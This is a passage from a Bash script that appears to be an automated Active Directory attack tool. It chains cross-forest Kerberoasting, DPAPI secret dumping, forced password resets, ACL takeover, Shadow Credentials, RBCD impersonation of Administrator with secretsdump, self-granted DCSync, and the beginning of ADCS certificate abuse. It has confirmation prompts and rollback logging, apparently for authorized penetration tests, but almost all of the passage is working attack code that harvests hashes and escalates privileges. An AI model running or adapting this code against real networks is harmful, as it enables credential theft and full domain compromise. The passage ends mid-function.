            info "Only built-in well-known SIDs present — no actionable foreign principals"
        fi
    fi

    subsection "Cross-forest exploitation paths"
    info "Reviewing each trust for actionable abuse:"
    echo "$partners" | while read -r pd; do
        [[ -z "$pd" ]] && continue
        echo -e "    ${C_PURPLE}▸ Trust toward ${C_BOLD}$pd${C_RESET}"
        echo -e "      ${C_GREY}- Cross-forest Kerberoast:${C_RESET} impacket-GetUserSPNs ${DOMAIN}/${USER} -target-domain $pd -request -dc-ip $DC_IP"
        echo -e "      ${C_GREY}- Foreign group membership / ACLs in $pd (check BloodHound 'Cross-domain')${C_RESET}"
        echo -e "      ${C_GREY}- If bidirectional + SIDHistory not filtered → SID History / inter-realm TGT abuse${C_RESET}"
        # Attempt cross-forest kerberoast automatically (read-only, high value)
        if have impacket-GetUserSPNs && [[ -n "$KERB_TICKET" ]]; then
            run "cross-forest kerberoast against $pd"
            KRB5CCNAME="$KERB_TICKET" impacket-GetUserSPNs "${DOMAIN}/${USER}" -k -no-pass \
                -dc-host "${DC_FQDN:-$DC_IP}" -target-domain "$pd" -request \
                -outputfile "$OUTDIR/kerberoast_xforest_${pd}.txt" 2>&1 | tee -a "$LOGFILE"
            [[ -s "$OUTDIR/kerberoast_xforest_${pd}.txt" ]] && \
                loot "★ Cross-forest Kerberoast hashes from $pd → kerberoast_xforest_${pd}.txt"
        fi
    done
}

# ===========================================================================
#  WINRM ACCESS + DPAPI  —  where can we land a shell, and what's in DPAPI
# ===========================================================================
# Run whoami /priv + /groups over WinRM and map dangerous rights to techniques
analyze_privileges() {
    local args; mapfile -t args < <(nxc_cred_args)
    subsection "Token privileges & dangerous rights (whoami /priv, /groups)"
    local pr; pr=$($NXC winrm "$DCT" "${args[@]}" -x "whoami /priv" 2>&1)
    echo "$pr" | tee -a "$LOGFILE" | tee "$OUTDIR/whoami_priv_${USER}.txt" >/dev/null
    local gr; gr=$($NXC winrm "$DCT" "${args[@]}" -x "whoami /groups" 2>&1)
    echo "$gr" >>"$OUTDIR/whoami_priv_${USER}.txt"

    # Privilege → escalation technique mapping
    local -A P=(
        [SeImpersonatePrivilege]="Potato → PrintSpoofer / GodPotato / JuicyPotatoNG = SYSTEM"
        [SeAssignPrimaryTokenPrivilege]="Token assignment → Potato = SYSTEM"
        [SeBackupPrivilege]="Read ANY file → dump SAM+SYSTEM / NTDS.dit (reg save / robocopy /b)"
        [SeRestorePrivilege]="Write ANY file/registry → service/DLL hijack = SYSTEM"
        [SeDebugPrivilege]="Dump LSASS / inject into SYSTEM processes (mimikatz/nanodump)"
        [SeTakeOwnershipPrivilege]="Take ownership of any object → overwrite & escalate"
        [SeLoadDriverPrivilege]="Load malicious driver → kernel = SYSTEM"
        [SeManageVolumePrivilege]="Raw disk write → plant SYSTEM file"
        [SeTcbPrivilege]="Act as part of the OS = SYSTEM"
        [SeCreateTokenPrivilege]="Forge tokens = SYSTEM"
    )
    local found=0 k
    for k in "${!P[@]}"; do
        if echo "$pr" | grep -qi "$k"; then loot "★ Dangerous privilege: ${C_BOLD}$k${C_RESET} → ${P[$k]}"; found=1; fi
    done
    # Dangerous group memberships
    local g
    for g in "Backup Operators" "Server Operators" "Account Operators" "DnsAdmins" \
             "Print Operators" "Hyper-V Administrators" "Group Policy Creator Owners" \
             "Schema Admins" "Enterprise Admins" "Domain Admins"; do
        echo "$gr" | grep -qi "$g" && { loot "★ Privileged group: ${C_BOLD}$g${C_RESET} → known escalation path"; found=1; }
    done
    [[ "$found" == "0" ]] && info "No standout dangerous privileges/groups on this token"
}

phase_winrm_dpapi() {
    [[ "$HAVE_AUTH" != "1" ]] && return
    section "WINRM ACCESS & DPAPI SECRETS"
    local args; mapfile -t args < <(nxc_cred_args)

    if [[ "$CAP_WINRM" == "1" ]]; then
        subsection "WinRM: can this account get a remote shell?"
        run "$NXC winrm $DCT ${args[*]}"
        local w; w=$($NXC winrm "$DCT" "${args[@]}" 2>&1)
        # nxc's winrm check frequently blows up under Kerberos while parsing the
        # negotiate challenge ("Unpacked data doesn't match … NTLMSSP", a Traceback
        # in enum_host_info). That's an nxc bug, NOT a lack of access — so don't
        # spew the traceback to the operator; keep it in the log and decide WinRM
        # eligibility from group membership, which is authoritative.
        local winrm_err=0
        if grep -qiE 'NTLMSSP|Traceback|proto_flow|Unpacked data|object has no attribute' <<<"$w"; then
            winrm_err=1; printf '%s\n' "$w" >>"$LOGFILE"
        else
            echo "$w" | tee -a "$LOGFILE"
        fi

        # Who is in 'Remote Management Users' (Administrators can WinRM too). Read
        # once via LDAP and reused both to decide access and to show the list.
        local rmu="" can_winrm=0
        grep -qi 'Pwn3d' <<<"$w" && can_winrm=1
        if [[ "$CAP_LDAP" == "1" ]]; then
            rmu=$($NXC ldap "$DCT" "${args[@]}" -M group-mem -o GROUP="Remote Management Users" 2>/dev/null)
            printf '%s\n' "$rmu" >>"$LOGFILE"; printf '%s\n' "$rmu" >"$OUTDIR/winrm_users.txt"
            local u_re; u_re=$(printf '%s' "$USER" | sed 's/[][\.^$*+?(){}|]/\\&/g')
            grep -qiE "(\\\\|[[:space:]])${u_re}([[:space:]]|\$)" <<<"$rmu" && can_winrm=1
        fi
        [[ -n "${OWNED_ADMIN[${USER,,}]:-}" ]] && can_winrm=1   # admins can always WinRM

        if [[ "$can_winrm" == "1" ]]; then
            loot "★ ${USER} has WinRM shell access!"
            if [[ -n "$KERB_TICKET" ]]; then
                ok "Shell:  KRB5CCNAME=$KERB_TICKET evil-winrm -i $DC_FQDN -r $DOMAIN"
            else
                ok "Shell:  evil-winrm -i $DC_FQDN -u $USER $( [[ -n "$HASH" ]] && echo "-H $HASH" || echo "-p '<pass>'" )"
            fi
            [[ "$winrm_err" == "1" ]] && info "(nxc's WinRM probe errored under Kerberos — access confirmed via group membership; use the evil-winrm line above)"
            [[ "$winrm_err" == "0" ]] && analyze_privileges   # whoami /priv only works if nxc's winrm didn't choke
        elif [[ "$winrm_err" == "1" ]]; then
            warn "WinRM probe errored (known nxc Kerberos bug) and ${USER} isn't in Remote Management Users → assume no WinRM"
        else
            info "${USER} cannot WinRM (not Pwn3d, not in Remote Management Users)"
        fi

        if [[ "$CAP_LDAP" == "1" ]]; then
            subsection "Members of 'Remote Management Users' (who can WinRM)"
            if [[ -n "$rmu" ]]; then echo "$rmu"; else info "none / not readable"; fi
        fi
    else
        info "WinRM (5985) not exposed on this host"
    fi

    if [[ "$CAP_SMB" == "1" ]]; then
        subsection "DPAPI: dumping protected secrets (needs local admin on target)"
        run "$NXC smb $DCT ${args[*]} --dpapi"
        local d; d=$($NXC smb "$DCT" "${args[@]}" --dpapi 2>&1); echo "$d" | tee -a "$LOGFILE" | tee "$OUTDIR/dpapi.txt"
        if echo "$d" | grep -qiE 'access.?denied|not.*admin|ERROR'; then
            info "DPAPI needs local admin — not available with this account (expected if not privileged)"
        fi
        # Harvest any plaintext DPAPI recovered → feed the engine
        while read -r p; do
            [[ -n "$p" ]] && { loot "DPAPI secret recovered: ${C_GREEN}$p${C_RESET}"; add_secret "$p" "DPAPI"; }
        done < <(echo "$d" | grep -oiP '(password|secret)\s*:\s*\K\S+' | sort -u)
        grep -qiE '\[CREDENTIAL\]|Saved' "$OUTDIR/dpapi.txt" 2>/dev/null && loot "DPAPI credential blobs decrypted → dpapi.txt"
    fi

    # Flag DPAPI material pulled from shares earlier. `-print -quit` stops find at
    # the first hit → tiny output, so grep -q can't SIGPIPE find under pipefail
    # (which would falsely report "no blobs"). Offline decryption itself runs
    # automatically inside phase_share_loot (phase_dpapi_offline).
    if find "$OUTDIR/shares" \( -ipath '*Protect*' -o -ipath '*Credentials*' \) -print -quit 2>/dev/null | grep -q .; then
        info "Offline DPAPI blobs present in looted shares (auto-decrypted in the share-looting phase)"
    fi
}

# ===========================================================================
#  ACL ABUSE  —  enumerate exploitable rights and (optionally) abuse them
# ===========================================================================
# bloodyAD authentication arguments for the current credential
bloody_args() {
    local a=(--host "$DCT" --dc-ip "$DC_IP" -d "$DOMAIN" -u "$USER")
    if   [[ "$KERBEROS" == "1" && -n "$KERB_TICKET" ]]; then a+=(-k)
    elif [[ -n "$HASH" ]]; then a+=(-p ":$HASH")
    else a+=(-p "$PASS"); fi
    printf '%s\n' "${a[@]}"
}

# Record the current (authenticated) identity as compromised, with the groups it
# belongs to, so the final summary can list "who we own" and crown the admins.
# Group membership is read via LDAP memberOf (bloodyAD) — any authenticated user
# can read it, so it works for every owned account, not just WinRM-capable ones.
record_owned_identity() {
    [[ "$HAVE_AUTH" != "1" || -z "$USER" ]] && return
    local key="${USER,,}"                                  # case-insensitive (Bob == bob)
    [[ -n "${OWNED_GROUPS[$key]:-}" ]] && return           # already recorded this principal
    local groups="" ba
    if have bloodyAD && [[ "$CAP_LDAP" == "1" ]]; then
        mapfile -t ba < <(bloody_args)
        groups=$(bloodyAD "${ba[@]}" get object "$USER" --attr memberOf 2>/dev/null \
                 | grep -oiP 'CN=\K[^,]+' | paste -sd', ' -)
    fi
    OWNED_GROUPS["$key"]="${groups:-—}"
    local admin=0
    grep -qiE "$ADMIN_GROUP_RE" <<<"$groups" && admin=1
    [[ "$key" == "administrator" ]] && admin=1
    [[ "$admin" == "1" ]] && OWNED_ADMIN["$key"]=1
    printf '%s\t%s\t%s\n' "$USER" "$([[ $admin == 1 ]] && echo ADMIN || echo user)" "${groups:-—}" \
        >>"$OUTDIR/owned_principals.txt"
}

phase_acl() {
    [[ "$HAVE_AUTH" != "1" ]] && return
    section "ACL ANALYSIS · EXPLOITABLE PERMISSIONS"
    [[ "$CAP_LDAP" != "1" ]] && { warn "LDAP not exposed → ACL analysis needs LDAP, skipping"; return; }
    have bloodyAD || { warn "bloodyAD unavailable, skipping ACL analysis"; return; }
    local ba; mapfile -t ba < <(bloody_args)
    local -A ABUSED=()   # object:action already handled, so we fire each once

    subsection "Objects the current account can write (bloodyAD get writable)"
    run "bloodyAD ${ba[*]} get writable --detail"
    local w; w=$(bloodyAD "${ba[@]}" get writable --detail 2>&1); echo "$w" | tee -a "$LOGFILE"
    local sname; sname="$(_safe_name "$USER")"
    echo "$w" >"$OUTDIR/acl_writable_${sname}.txt"

    if ! echo "$w" | grep -qiE 'distinguishedName|WRITE|GenericAll|Owner'; then
        info "No exploitable outbound ACLs for $USER"
        return
    fi
    loot "$USER holds writable rights over one or more objects — see acl_writable_${sname}.txt"

    # Parse candidate target objects (CN of each writable DN) and their rights
    # bloodyAD groups output per-object: a 'distinguishedName: CN=...' line followed by the granted permissions.
    local cur_dn="" cur_name="" cur_sam="" cur_class=""
    while IFS= read -r line; do
        if [[ "$line" =~ distinguishedName:\ *(.*) ]]; then
            cur_dn="${BASH_REMATCH[1]}"
            cur_name=$(echo "$cur_dn" | grep -oiP '^(CN|OU)=\K[^,]+')
            cur_class=""
            [[ "$cur_dn" =~ ^[Oo][Uu]= ]] && cur_class="ou"   # organizational unit
            # Resolve the sAMAccountName — abuse tools need it, NOT the CN/display
            # name. A "CN=Jane Doe" must become "jane.doe" or every reset/
            # shadow/RBCD against it fails (a display-name CN stalls the chain).
            cur_sam=$(bloodyAD "${ba[@]}" get object "$cur_dn" --attr sAMAccountName 2>/dev/null \
                        | grep -oiP 'sAMAccountName:\s*\K\S+' | head -1)
            [[ -z "$cur_sam" ]] && cur_sam="$cur_name"
            # Domain head (DC=…,DC=… with no CN) → writeDacl here means DCSync
            if [[ -z "$cur_name" && "$cur_dn" =~ ^[Dd][Cc]= ]]; then
                cur_name="${DOMAIN:-domain}"; cur_sam="$cur_name"; cur_class="domain"
            fi
        fi
        [[ "$line" =~ objectClass.*group ]]    && cur_class="group"
        [[ "$line" =~ objectClass.*user  ]]    && cur_class="user"
        [[ "$line" =~ objectClass.*computer ]] && cur_class="computer"
        [[ "$line" =~ objectClass.*organizationalUnit ]] && cur_class="ou"

        # Only react to rights that ACTUALLY escalate — ignore benign attribute
        # writes (thumbnailPhoto, pager, …). Each object+action fires once.
        [[ -z "$cur_name" ]] && continue
        local ll="${line,,}" act=""
        if   [[ "$ll" == *keycredentiallink* ]]; then act="shadow"
        elif [[ "$ll" == *allowedtoactonbehalfofotheridentity* ]]; then act="rbcd"
        elif [[ "$ll" == *serviceprincipalname* ]]; then act="spn"
        elif [[ "$ll" == *member:* && ( "$cur_class" == "group" || "$cur_dn" =~ [Gg]roup ) ]]; then act="group"
        elif [[ "$ll" =~ (genericall|owner|fullcontrol|writedacl|allextendedrights) ]]; then act="full"
        else continue; fi

        local dkey="${cur_sam}:${act}"
        [[ -n "${ABUSED[$dkey]:-}" ]] && continue
        ABUSED["$dkey"]=1
        # Always abuse by sAMAccountName (cur_sam); cur_name is only for display.
        local tgt="$cur_sam"

        case "$act" in
            shadow) warn "Writable msDS-KeyCredentialLink on ${C_BOLD}$cur_name${C_RESET} → Shadow Credentials"; _abuse_shadowcred "$tgt" ;;
            rbcd)   warn "Writable RBCD attr on ${C_BOLD}$cur_name${C_RESET} → Resource-Based Delegation"; _abuse_rbcd "$tgt" ;;
            spn)    _abuse_writespn "$tgt" ;;
            group)  warn "Writable GROUP membership: ${C_BOLD}$cur_name${C_RESET}"; _abuse_group "$tgt" ;;
            full)
                warn "Full control over ${C_BOLD}$cur_name${C_RESET} (${cur_class:-?})"
                if [[ "$cur_class" == "domain" ]]; then _abuse_dcsync_dacl
                elif [[ "$cur_class" == "ou" || "$cur_dn" =~ ^[Oo][Uu]= ]]; then
                    loot "GenericAll over OU '${cur_name}' → can restore & reset its (deleted) child objects"
                    info "  → handled in the Account Lifecycle phase (AD Recycle Bin restore → password reset → pivot)"
                elif [[ "$cur_class" == "group" || "$cur_dn" =~ [Gg]roup ]]; then _abuse_group "$tgt"
                elif [[ "$cur_class" == "computer" || "$tgt" == *\$ ]]; then _abuse_rbcd "$tgt" || _abuse_shadowcred "$tgt"
                else _abuse_user_smart "$tgt"; fi ;;
        esac
    done <<<"$w"
}

# Add the current user to a group we can write (with rollback)
_abuse_group() {
    local grp="$1"; local ba; mapfile -t ba < <(bloody_args)
    [[ "$DO_ABUSE" != "1" ]] && { info "  (report-only; run with --abuse to add $USER to '$grp')"; return; }
    confirm "  Add ${USER} to group '${grp}'?" || return
    run "bloodyAD ${ba[*]} add groupMember '$grp' '$USER'"
    if bloodyAD "${ba[@]}" add groupMember "$grp" "$USER" 2>&1 | tee -a "$LOGFILE" | grep -qi 'added\|success'; then
        loot "★ Added ${USER} to '${grp}' — re-enumerating with new privileges"
        rb_record "Added $USER to group $grp" \
                  "bloodyAD ${ba[*]} remove groupMember '$grp' '$USER'"
        # same identity, more rights → re-assess ONCE by re-queueing self. Guard
        # against looping: without this, the re-assessment re-detects the same
        # group-write and re-queues again and again (the user gets pwned N×).
        if [[ -z "${REQUEUED_SELF[${USER,,}]:-}" ]]; then
            REQUEUED_SELF["${USER,,}"]=1
            unset "SEEN_CREDS[${USER,,}]"
            queue_cred "$USER" "$PASS" "$HASH"
        else
            info "  (already re-assessed ${USER} once with new group rights — not looping)"
        fi
    else
        warn "Failed to add to '$grp' (rights may not cover membership)"
    fi
}

# Force-change a target user's password (GenericAll / ForceChangePassword), with rollback note
_abuse_user() {
    local target="$1"; local ba; mapfile -t ba < <(bloody_args)
    [[ "$DO_ABUSE" != "1" ]] && { info "  (report-only; run with --abuse to reset '$target' password)"; return; }
    confirm "  Force-reset password of '${target}' (DESTRUCTIVE — original unknown)?" || return
    run "bloodyAD ${ba[*]} set password '$target' '$PIVOT_PW'"
    if bloodyAD "${ba[@]}" set password "$target" "$PIVOT_PW" 2>&1 | tee -a "$LOGFILE" | grep -qi 'success\|changed'; then
        loot "★ Password of '${target}' reset → pivoting as that user"
        rb_record "Reset password of $target (ORIGINAL UNKNOWN — coordinate restore with client)" \
                  "echo 'Manual action required: restore original password for $target'"
        queue_cred "$target" "$PIVOT_PW" ""
        return 0
    else
        warn "Failed to reset '$target' password"
        return 1
    fi
}

# Take over an object's ACL when we hold WriteOwner / WriteDACL (but not yet a
# usable right): become owner if needed, grant ourselves GenericAll, then drive
# the normal reset/shadow. This is the missing link in WriteOwner→GenericAll→
# reset chains (WriteOwner alone can't reset until you grant yourself the right).
_abuse_acl_takeover() {
    local target="$1"; local ba; mapfile -t ba < <(bloody_args)
    [[ "$DO_ABUSE" != "1" ]] && { info "  (report-only; --abuse to take over ACL of '$target' → GenericAll → reset)"; return 1; }
    confirm "  Take over '${target}' (set owner if needed, grant ${USER} GenericAll, then reset)?" || return 1
    # 1) Try to grant ourselves GenericAll directly (works if we hold WriteDACL or
    #    already own the object). If that's refused, take ownership first.
    if ! bloodyAD "${ba[@]}" add genericAll "$target" "$USER" 2>&1 | tee -a "$LOGFILE" | grep -qiE 'success|granted|added|modif|written'; then
        run "bloodyAD ${ba[*]} set owner '$target' '$USER'"
        if ! bloodyAD "${ba[@]}" set owner "$target" "$USER" 2>&1 | tee -a "$LOGFILE" | grep -qiE 'success|owner|changed|modif|written'; then
            warn "Could not take ownership of '$target'"; return 1
        fi
        rb_record "Set owner of $target to $USER" "echo 'Manual: restore original owner of $target'"
        if ! bloodyAD "${ba[@]}" add genericAll "$target" "$USER" 2>&1 | tee -a "$LOGFILE" | grep -qiE 'success|granted|added|modif|written'; then
            warn "Took ownership but could not grant GenericAll over '$target'"; return 1
        fi
    fi
    rb_record "Granted $USER GenericAll over $target" "bloodyAD ${ba[*]} remove genericAll '$target' '$USER'"
    loot "★ Took over ACL of '${target}' (owner/GenericAll) → reset / shadow"
    _abuse_shadowcred "$target" || _abuse_user "$target"
}

# Smart takeover of a user we have full/partial control over: non-destructive
# Shadow Credentials first, then a direct password reset (GenericAll /
# ForceChangePassword), and only if those fail, a WriteOwner/WriteDACL takeover.
_abuse_user_smart() {
    local target="$1"
    _abuse_shadowcred "$target" && return 0
    _abuse_user "$target"       && return 0
    _abuse_acl_takeover "$target"
}

# Shadow Credentials (msDS-KeyCredentialLink) → recover target's NT hash via PKINIT.
# Non-destructive (certipy 'auto' adds the key, authenticates, then removes it).
# Returns 0 if it recovered a hash.
_abuse_shadowcred() {
    local target="$1"
    have certipy || return 1
    [[ "$DO_ABUSE" != "1" ]] && { info "  (--abuse to try Shadow Credentials on '$target')"; return 1; }
    confirm "  Shadow Credentials on '${target}' (non-destructive, recovers its hash)?" || return 1
    # Prefer password/hash (certipy Kerberos is flaky); -target/-dc-host + ccache
    # only as fallback. Mirrors phase_adcs so shadow works on NTLM-on labs too.
    local cbase=(-u "${USER}@${DOMAIN}" -account "$target" -dc-ip "$DC_IP" -ns "$DC_IP" -target "${DC_FQDN:-$DCT}") cauth=() cenv=()
    if   [[ -n "$PASS" ]]; then cauth=(-p "$PASS")
    elif [[ -n "$HASH" ]]; then cauth=(-hashes ":$HASH")
    elif [[ -n "$KERB_TICKET" ]]; then cauth=(-k -no-pass -dc-host "${DC_FQDN:-$DCT}"); cenv=(env "KRB5CCNAME=$KERB_TICKET"); fi
    run "certipy shadow auto ${cbase[*]} ${cauth[*]}"
    local out; out=$("${cenv[@]}" certipy shadow auto "${cbase[@]}" "${cauth[@]}" 2>&1)
    if grep -qiE 'authentication failed|invalidCredentials|NTLM.*failed|No credentials provided' <<<"$out" \
       && [[ -n "$KERB_TICKET" && "${cauth[0]}" != "-k" ]]; then
        cauth=(-k -no-pass -dc-host "${DC_FQDN:-$DCT}"); cenv=(env "KRB5CCNAME=$KERB_TICKET")
        out=$("${cenv[@]}" certipy shadow auto "${cbase[@]}" "${cauth[@]}" 2>&1)
    fi
    echo "$out" | tee -a "$LOGFILE"
    local nt; nt=$(echo "$out" | grep -oiP "Got hash for .*:\s*\K\S+" | awk -F: '{print $NF}' | head -1)
    if [[ "$nt" =~ ^[a-fA-F0-9]{32}$ ]]; then
        loot "★ Shadow Credentials → NT hash of ${C_BOLD}$target${C_RESET}: ${C_MAGENTA}$nt${C_RESET}"
        note_cred_source "$target" "Shadow Credentials (msDS-KeyCredentialLink)"
        queue_cred "$target" "" "$nt"
        return 0
    fi
    warn "Shadow Credentials did not yield a hash for $target"; return 1
}

# Resource-Based Constrained Delegation: write msDS-AllowedToActOnBehalfOf… on a
# computer we control, then impersonate Administrator to it.
_abuse_rbcd() {
    local target="$1"   # must be a COMPUTER object we can write (e.g. DC$)
    [[ "$DO_ABUSE" != "1" ]] && { info "  (--abuse to try RBCD on '$target')"; return 1; }
    # RBCD needs the target to have an SPN to request a service ticket to — i.e. a
    # computer account. Writing the attribute on a user is a dead end, so don't
    # waste a machine-account creation + noisy traceback on it.
    [[ "$target" != *\$ ]] && { info "  RBCD not applicable to user '$target' (computer accounts only)"; return 1; }
    have impacket-getST && have impacket-addcomputer || return 1
    confirm "  RBCD on '${target}' (creates a machine account if MachineAccountQuota>0)?" || return 1
    local ba; mapfile -t ba < <(bloody_args)
    local cpass="ADAutoPwn_RBCD_123!" dch="${DC_FQDN:-$DCT}"
    run "impacket-addcomputer (adpwn\$) via $USER"
    # Kerberos addcomputer REQUIRES -dc-host (DNS name), or it errors out.
    local addout
    if   [[ -n "$HASH" ]]; then addout=$(impacket-addcomputer "$DOMAIN/$USER" -hashes ":$HASH" -dc-ip "$DC_IP" -dc-host "$dch" -computer-name 'adpwn$' -computer-pass "$cpass" 2>&1)
    elif [[ "$KERBEROS" == "1" && -n "$KERB_TICKET" ]]; then addout=$(KRB5CCNAME="$KERB_TICKET" impacket-addcomputer "$DOMAIN/$USER" -k -no-pass -dc-ip "$DC_IP" -dc-host "$dch" -computer-name 'adpwn$' -computer-pass "$cpass" 2>&1)
    else addout=$(impacket-addcomputer "$DOMAIN/$USER:$PASS" -dc-ip "$DC_IP" -dc-host "$dch" -computer-name 'adpwn$' -computer-pass "$cpass" 2>&1); fi
    echo "$addout" | tee -a "$LOGFILE"
    if ! grep -qiE 'Successfully added|added the machine account' <<<"$addout"; then
        warn "Could not add machine account (MachineAccountQuota=0 or no rights) → RBCD not possible from $USER"
        return 1
    fi
    rb_record "Created machine account adpwn\$" "impacket-addcomputer '$DOMAIN/$USER' -dc-ip '$DC_IP' -dc-host '$dch' -computer-name 'adpwn\$' -delete 2>/dev/null"
    run "bloodyAD add rbcd '$target' 'adpwn\$'"
    bloodyAD "${ba[@]}" add rbcd "$target" 'adpwn$' 2>&1 | tee -a "$LOGFILE"
    rb_record "Set RBCD on $target → adpwn\$" "bloodyAD ${ba[*]} remove rbcd '$target' 'adpwn\$'"
    local svc="cifs/${target%\$}.${DOMAIN}"
    run "impacket-getST -spn $svc -impersonate Administrator $DOMAIN/adpwn\$"
    local stout; stout=$(impacket-getST -spn "$svc" -impersonate Administrator "$DOMAIN/adpwn\$:$cpass" -dc-ip "$DC_IP" -dc-host "$dch" 2>&1); echo "$stout" | tee -a "$LOGFILE"
    # Real success only — getST prints "Saving ticket in <file>". Don't fall for a
    # stale .ccache lying in CWD (that produced bogus "RBCD succeeded" before).
    local stfile; stfile=$(grep -oiP 'Saving ticket in \K\S+\.ccache' <<<"$stout" | head -1)
    if [[ -n "$stfile" && -f "$stfile" ]] && ! grep -qiE 'KDC_ERR|SessionError|does not have' <<<"$stout"; then
        mv -f "$stfile" "$OUTDIR/rbcd_admin.ccache" 2>/dev/null
        loot "★ RBCD → Administrator service ticket for $target → rbcd_admin.ccache"
        note_cred_source "Administrator@$target" "RBCD impersonation"
        if [[ "${target%\$}" == "$DC_HOST" ]]; then
            subsection "RBCD ticket targets the DC → secretsdump"
            KRB5CCNAME="$OUTDIR/rbcd_admin.ccache" impacket-secretsdump -k -no-pass "${DC_FQDN}" -just-dc \
                -outputfile "$OUTDIR/dcsync_rbcd" 2>&1 | tee -a "$LOGFILE" | tee -a "$OUTDIR/secretsdump.txt"
        fi
        return 0
    fi
    warn "RBCD did not produce a usable ticket for $target"; return 1
}

# Targeted Kerberoast via WriteSPN: set a temp SPN, roast, then remove it
_abuse_writespn() {
    local target="$1"; local ba; mapfile -t ba < <(bloody_args)
    [[ "$CAP_KERBEROS" != "1" ]] && return
    warn "WriteSPN over '${C_BOLD}$target${C_RESET}' → targeted Kerberoast possible"
    [[ "$DO_ABUSE" != "1" ]] && { info "  (report-only; --abuse to set a temp SPN and roast '$target')"; return; }
    confirm "  Set a temporary SPN on '$target' and Kerberoast it?" || return
    local spn="ADAUTOPWN/$target"
    if bloodyAD "${ba[@]}" set object "$target" servicePrincipalName -v "$spn" 2>&1 | tee -a "$LOGFILE" | grep -qiE 'success|added|modif'; then
        rb_record "Set temporary SPN $spn on $target" \
                  "bloodyAD ${ba[*]} remove object '$target' servicePrincipalName -v '$spn'"
        local outf="$OUTDIR/kerberoast_writespn_$(_safe_name "$target").txt"
        run "impacket-GetUserSPNs $(imp_principal) -k -no-pass -request-user $target"
        KRB5CCNAME="$KERB_TICKET" impacket-GetUserSPNs "$(imp_principal)" -k -no-pass \
            -dc-host "${DC_FQDN:-$DC_IP}" -request-user "$target" -outputfile "$outf" 2>&1 | tee -a "$LOGFILE"
        if [[ -s "$outf" ]]; then
            loot "★ WriteSPN Kerberoast hash captured for $target"
            cat "$outf" >>"$OUTDIR/kerberoast_hashes.txt"
            [[ "$DO_CRACK" == "1" ]] && crack_hashes "$outf" 13100 "Kerberoast"
        fi
        bloodyAD "${ba[@]}" remove object "$target" servicePrincipalName -v "$spn" 2>&1 | tee -a "$LOGFILE" >/dev/null
        ok "Temporary SPN removed from $target"
    else
        warn "Could not set SPN on $target"
    fi
}

# WriteDACL / GenericAll over the DOMAIN head → grant ourselves DCSync, then dump.
_abuse_dcsync_dacl() {
    local ba; mapfile -t ba < <(bloody_args)
    warn "Writable DACL on the domain head → can self-grant ${C_BOLD}DCSync${C_RESET}"
    [[ "$DO_ABUSE" != "1" ]] && { info "  (report-only; --abuse to grant $USER DCSync and dump the domain)"; return; }
    confirm "  Grant '${USER}' DCSync rights on '${DOMAIN}' and dump all hashes?" || return
    run "bloodyAD ${ba[*]} add dcsync '$USER'"
    if bloodyAD "${ba[@]}" add dcsync "$USER" 2>&1 | tee -a "$LOGFILE" | grep -qiE 'success|added|grant|written|dcsync'; then
        loot "★ Granted DCSync to ${USER} — replicating the domain"
        rb_record "Granted DCSync to $USER on $DOMAIN" "bloodyAD ${ba[*]} remove dcsync '$USER'"
        phase_dcsync
    else
        warn "Could not self-grant DCSync (WriteDACL may not cover the domain object)"
    fi
}

# ADCS ESC1: request a cert impersonating Administrator, then auth → NT hash/TGT.
# Best-effort parse of certipy output for CA + a template flagged ESC1.
# ---- ADCS auto-abuse: certipy already IDENTIFIES each ESC (find -vulnerable);
# here we ABUSE each one. Auth is password/hash-first (certipy's Kerberos LDAP
# bind is flaky) and every call carries -target/-dc-ip. ------------------------
_ADCS_AUTH=(); _ADCS_ENV=()
_adcs_setauth() {                       # build certipy auth args for the current cred
    _ADCS_AUTH=(-u "${USER}@${DOMAIN}"); _ADCS_ENV=()
    if   [[ -n "$PASS" ]]; then _ADCS_AUTH+=(-p "$PASS")
    elif [[ -n "$HASH" ]]; then _ADCS_AUTH+=(-hashes ":$HASH")
    elif [[ -n "$KERB_TICKET" ]]; then _ADCS_AUTH+=(-k -no-pass); _ADCS_ENV=(env "KRB5CCNAME=$KERB_TICKET"); fi
}
_adcs_template_for() {                  # template name certipy tied to a given ESC tag
    awk -v esc="$2" 'BEGIN{IGNORECASE=1}/Template Name/{t=$0} $0 ~ esc {print t}' <<<"$1" \
        | grep -ioP 'Template Name\s*:\s*\K\S+' | head -1
}
_adcs_admin_sid() {                     # domain Administrator (RID 500) SID, best-effort
    local ba sid; mapfile -t ba < <(bloody_args)
    sid=$(bloodyAD "${ba[@]}" get object "$USER" --attr objectSid 2>/dev/null | grep -oiP 'S-1-5-21-[0-9-]+' | head -1)
    [[ -n "$sid" ]] && echo "${sid%-*}-500"
}
# certipy auth a PFX → recover the principal's NT hash (or TGT) and pivot on it.
_adcs_pwn_pfx() {                       # _adcs_pwn_pfx <pfx-basename> <label> [who]
    local pfx="$1" label="$2" who="${3:-administrator}"
    [[ -z "$pfx" || ! -f "$OUTDIR/$pfx" ]] && { warn "  ${label}: no certificate produced"; return 1; }
    rb_record "${label}: issued/used a certificate for '${who}'" "echo 'Manual: revoke the issued certificate at the CA'"
    run "certipy auth -pfx $pfx -dc-ip $DC_IP"
    local aout; aout=$( cd "$OUTDIR" && "${_ADCS_ENV[@]}" certipy auth -pfx "$pfx" -dc-ip "$DC_IP" 2>&1 ); echo "$aout" | tee -a "$LOGFILE"
    local nt; nt=$(grep -oiP 'Got hash for .*:\s*\K[a-f0-9]{32}:[a-f0-9]{32}' <<<"$aout" | awk -F: '{print $NF}' | head -1)
    if [[ "$nt" =~ ^[a-fA-F0-9]{32}$ ]]; then
        loot "★★★ ${label} → ${who} NT hash: ${C_MAGENTA}$nt${C_RESET}"
        note_cred_source "$who" "ADCS ${label} (certipy)"; queue_cred "$who" "" "$nt"; return 0
    fi
    local cc; cc=$(ls -t "$OUTDIR"/${who}*.ccache "$OUTDIR"/*.ccache 2>/dev/null | head -1)
    [[ -n "$cc" ]] && { loot "${label} → ${who} TGT cached → $(basename "$cc") (export KRB5CCNAME=)"; return 0; }
    warn "  ${label}: cert issued but auth gave no hash/TGT — finish manually"; return 1
}
# Request a cert AS Administrator (SAN/UPN impersonation), then auth+pivot.
# with_sid=1 embeds the SID extension (strong-mapping envs: ESC1/2/6/15);
# with_sid=0 omits it (the whole point of ESC9/10/16 is the missing extension).
_adcs_req_admin() {                     # _adcs_req_admin <ca> <tpl> <label> <with_sid> [extra…]
    local ca="$1" tpl="$2" label="$3" with_sid="$4"; shift 4
    _adcs_setauth
    confirm "  ${label}: request a cert as Administrator via '$tpl' on CA '$ca'?" || return 1
    local sidargs=(); [[ "$with_sid" == "1" && -n "$_ADCS_SID" ]] && sidargs=(-sid "$_ADCS_SID")
